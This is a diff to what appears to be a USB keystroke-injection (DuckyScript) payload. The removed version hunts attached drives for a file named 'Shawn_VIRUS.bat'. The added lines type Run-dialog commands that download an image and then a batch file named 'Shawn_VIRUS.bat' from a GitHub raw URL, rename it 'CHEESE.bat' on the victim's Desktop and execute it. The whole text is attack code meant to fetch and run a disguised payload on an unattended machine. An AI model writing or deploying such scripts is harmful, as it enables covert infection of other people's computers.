@@ -1,7 +1,12 @@
 DELAY 1000
 GUI r
 DELAY 200
-STRING powershell -NoProfile -WindowStyle Hidden -Command "Get-PSDrive -PSProvider FileSystem | Where-Object { $_.Root -ne 'C:\' } | ForEach-Object { $p=Join-Path $_.Root 'Shawn_VIRUS.bat'; if(Test-Path $p){ Copy-Item $p -Destination ([Environment]::GetFolderPath('Desktop')) -Force; break } }"
+STRING $u='https://raw.githubusercontent.com/GOD-png/shawn/main/Shawn-Albe-Freako/shawn.jpg'; $o="$env:USERPROFILE\Desktop\shawn.jpg"; Invoke-WebRequest $u -OutFile $o
 DELAY 200
 ENTER
-
+DELAY 200
+GUI r
+DELAY 200
+STRING $u='https://raw.githubusercontent.com/GOD-png/shawn/main/Shawn-Albe-Freako/Shawn_VIRUS.bat'; $o="$env:USERPROFILE\Desktop\CHEESE.bat"; Invoke-WebRequest $u -OutFile $o; Start-Process $o
+DELAY 200
+ENTER
